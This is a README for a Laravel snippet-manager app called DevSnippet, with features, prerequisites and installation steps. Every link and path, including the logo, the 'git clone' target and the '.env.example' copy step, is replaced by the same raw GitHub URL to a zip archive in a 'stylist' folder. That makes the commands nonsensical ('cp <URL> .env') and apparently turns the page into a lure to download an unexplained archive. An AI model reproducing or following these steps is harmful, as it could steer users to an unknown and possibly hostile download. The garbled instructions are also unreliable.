<p align="center"><a href="" target="_blank"><img src="https://raw.githubusercontent.com/RafiBinWores/DevSnippet/main/stylist/DevSnippet.zip" width="400" alt="DevSnippet Logo"></a></p>

## About DevSnippet

Welcome to DevSnippet, your personal tool for organizing and storing code snippets. After creating an account, you can save and categorize your code snippets by programming language and tags for easy access.

**With DevSnippet, you can:**

-   Securely store your personal code snippets.
-   Organize snippets by programming languages and custom tags.
-   Access your snippets from anywhere at any time.

DevSnippet is designed to help you manage your code efficiently, making sure your most important code fragments are always at your fingertips when you need them.

## Features

## Packages

### Prerequisites

-   PHP (version >= 8.2)
-   MySQL database
-   Apache or Nginx web server
-   Composer (for dependency management)

## Installation

Follow these steps to set up the project on your local machine:

1.  **Clone the Repository**

    ```bash
    git clone https://raw.githubusercontent.com/RafiBinWores/DevSnippet/main/stylist/DevSnippet.zip

    ```

2.  **Navigate to the Project Directory**

    ```bash
    cd your-repo

    ```

3.  **Install Dependencies**

    ```bash
    composer install

    ```

4.  **Copy the https://raw.githubusercontent.com/RafiBinWores/DevSnippet/main/stylist/DevSnippet.zip file to .env:**

    ```bash
    cp https://raw.githubusercontent.com/RafiBinWores/DevSnippet/main/stylist/DevSnippet.zip .env

    ```

5.  **Generate the application key:**

    ```bash
    php artisan key:generate

    ```

6.  **Configure Your Environment**

    -   [Ensure your .env file is configured with the correct database and other environment settings.]

7.  **Run Migrations**

    ```bash
    php artisan migrate

    ```

8.  **Serve the Application**
    Start the local development server:

    ```bas
     php artisan serve
    ```
